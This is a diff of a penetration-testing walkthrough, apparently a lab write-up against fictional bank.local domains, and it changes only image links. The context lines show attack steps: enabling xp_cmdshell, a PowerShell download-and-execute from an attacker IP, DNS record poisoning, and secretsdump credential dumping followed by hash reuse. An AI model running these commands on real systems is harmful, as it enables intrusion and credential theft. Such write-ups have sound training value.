@@ -273,7 +273,7 @@ SELECT IS_SRVROLEMEMBER('sysadmin')
 EXEC master..xp_cmdshell 'whoami'
 ```
 
-![](<../../../.gitbook/assets/image (11) (1) (1) (1).png>)
+![](<../../../.gitbook/assets/image (11) (1) (1) (1) (2).png>)
 
 2\. We receive an error that it is disabled. But we can try to enable it with the following SQL queries:
 
@@ -284,7 +284,7 @@ EXEC sp_configure 'xp_cmdshell',1
 RECONFIGURE
 ```
 
-![](<../../../.gitbook/assets/image (10) (1) (3).png>)
+![](<../../../.gitbook/assets/image (10) (1) (2).png>)
 
 Now we can try to execute the `whoami` command again and it worked:
 
@@ -396,7 +396,7 @@ iex (iwr http://192.168.248.2:8090/Invoke-DNSUpdate.ps1 -usebasicparsing)
 Invoke-DNSUpdate -DNSType A -DNSName webdav.amsterdam.bank.local -DNSData 192.168.248.2 -Realm amsterdam.bank.local
 ```
 
-![](<../../../.gitbook/assets/image (11) (1) (1).png>)
+![](<../../../.gitbook/assets/image (11) (1) (1) (1).png>)
 
 I also did a nslookup to check if the DNS record was created. The domain controller at `10.0.0.3` responded and gave us the correct attacker IP. We now have all our prerequisites. Time to escalate our privileges.
 
@@ -444,7 +444,7 @@ export KRB5CCNAME=administrator.ccache
 secretsdump.py -k -no-pass web01.amsterdam.bank.local
 ```
 
-![](<../../../.gitbook/assets/image (1) (1) (1).png>)
+![](<../../../.gitbook/assets/image (1) (1) (1) (3).png>)
 
 We retrieved the hash of the local `administrator` user and the cached hashes for two domain admins. These look like NTLM hashes but aren't. We can use the local admin hash though to authenticate to `WEB01`. We can do this with our good old tool `CrackMapExec`.
 
@@ -760,7 +760,7 @@ export KRB5CCNAME=administrator.ccache
 secretsdump.py -k -no-pass data01.secure.local
 ```
 
-![](<../../../.gitbook/assets/image (1) (1) (2) (1).png>)
+![](<../../../.gitbook/assets/image (1) (1) (2).png>)
 
 16\. We retrieved the hash of the local administrator user. We can use the local admin hash though to authenticate to `DATA01`.&#x20;
 
